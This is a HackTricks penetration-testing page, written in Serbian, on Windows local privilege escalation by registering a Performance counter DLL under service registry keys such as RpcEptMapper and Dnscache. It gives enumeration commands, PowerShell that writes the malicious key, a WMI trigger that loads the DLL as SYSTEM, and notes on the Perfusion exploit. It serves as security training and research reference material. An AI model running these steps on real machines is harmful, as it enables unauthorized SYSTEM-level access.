# Dozvola AppendData/AddSubdirectory nad Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Originalna objava je** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Sažetak

Ako imate samo **`Create Subkey`** / **`AppendData/AddSubdirectory`** nad service registry ključem, to je i dalje dobar privesc trag. Obično **ne možete** direktno da prepišete `ImagePath`, `ServiceDll` ili druge postojeće vrednosti, ali možda i dalje možete da kreirate podključ **`Performance`** pod:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Bilo kojim drugim ključem **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** gde vaš token ima **`KEY_CREATE_SUB_KEY`**

Trik je u tome što Windows i dalje podržava legacy model registracije **PerfLib V1**. Ako service ima podključ **`Performance`**, Windows može da učita DLL iz njega kada consumer brojača performansi zatraži podatke.

Prema Microsoft dokumentaciji, minimalna registracija je:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Dakle, **ofanzivni zaključak je: nemojte odbaciti nalaz service registry-ja samo zato što ste dobili samo `CreateSubKey`, a ne `SetValue`**.<sup>[[3]](#references)</sup>

## Zašto je ovo dovoljno za code execution

Podključ `Performance` **obično ne postoji podrazumevano na ovim servisima**, tako da je **`KEY_CREATE_SUB_KEY`** primitive koji vam je potreban. Kada ključ postoji i sadrži `Library`/`Open`/`Collect`/`Close`, bilo koji **performance counter consumer** može da pokrene učitavanje DLL-a.<sup>[[3]](#references)</sup>

Nekoliko važnih detalja:

- Vrednost **`Library`** može da pokazuje na **punu putanju do DLL-a**.
- DLL mora da exportuje **`OpenPerfData`**, **`CollectPerfData`** i **`ClosePerfData`** i da vraća `ERROR_SUCCESS`.
- Kod se izvršava u **kontekstu consumer-a**, **ne nužno u samom procesu ranjivog servisa**.
- U klasičnom slučaju `RpcEptMapper` / `Dnscache`, **WMI performance query** može da natera **`wmiprvse.exe`** da učita DLL kao **`NT AUTHORITY\SYSTEM`**.

Zbog toga se ova primitive lako previdi tokom triage-a: ključ nadređenog servisa nije „potpuno upisiv“, ali se i dalje može weaponize-ovati.

## Brza enumeracija

Ručno proveravanje pomoću **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
PowerShell primer za pronalaženje principalâ sa niskim privilegijama koji imaju **`CreateSubKey`** nad ključevima servisa:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Korisni alati:

- **PrivescCheck**: `Get-ModifiableRegistryPath` je napravljen posebno za otkrivanje ove klase problema.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatizuje DLL drop, registraciju `Performance`, WMI trigger, dupliciranje tokena i čišćenje na starijim ranjivim targetima (na primer: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Tok zloupotrebe

Kreirajte `Performance` podključ i popunite potrebne vrednosti:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Zatim pokrenite **privilegovani** potrošač performansi. Klasičan primer je WMI upit nad klasama `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operativne napomene:

- Pokretanje **`perfmon.exe`** je korisno za proveru da li je registracija counter-a ispravna, ali to obično učitava DLL samo u **kontekstu vašeg korisnika**.
- Za stvarni LPE, pokrenite privilegovani consumer kao što je **WMI**.
- Ako pišete sopstveni exploit, direktno pokretanje `cmd.exe` iz DLL-a obično vam ostavlja shell u **session 0**. `Perfusion` ovo rešava dupliciranjem privilegovanog token-a u proces koji je kreiran suspendovan u session-u napadača.<sup>[[4]](#references)</sup>
- Uskladite arhitekturu DLL-a sa ciljanim consumer-om (**x64 na x64 sistemima**).

## Napomene o verzijama / noviji razvoj

Istorijski, ugrađeni weak ključevi bili su:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` i `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` navodi da su ažuriranja iz **aprila 2021.** uklonila jednostavan exploitation path na ažuriranim sistemima **Windows 8 / Windows Server 2012**, dok su **Windows 7 / Windows Server 2008 R2** ostali exploitable preko **`Dnscache`**.<sup>[[4]](#references)</sup>

Ovaj primitive **nije samo istorijski**. U **januaru 2025.**, Microsoft je zakrpio povezani problem u AD DS-u, gde su članovi grupe **`Network Configuration Operators`** mogli da kreiraju podključeve u okviru **`Dnscache`** i **`NetBT`**, a ista ideja sa **registracijom Performance-counter DLL-a** mogla je ponovo da se iskoristi za dostizanje **SYSTEM** privilegija na podržanim sistemima.<sup>[[2]](#references)</sup>

Zato je savremena lekcija generička: kad god principal sa niskim privilegijama ima **`CreateSubKey`** nad ključem **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, proverite da li je dovoljan child key **`Performance`** pre nego što odbacite nalaz.

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
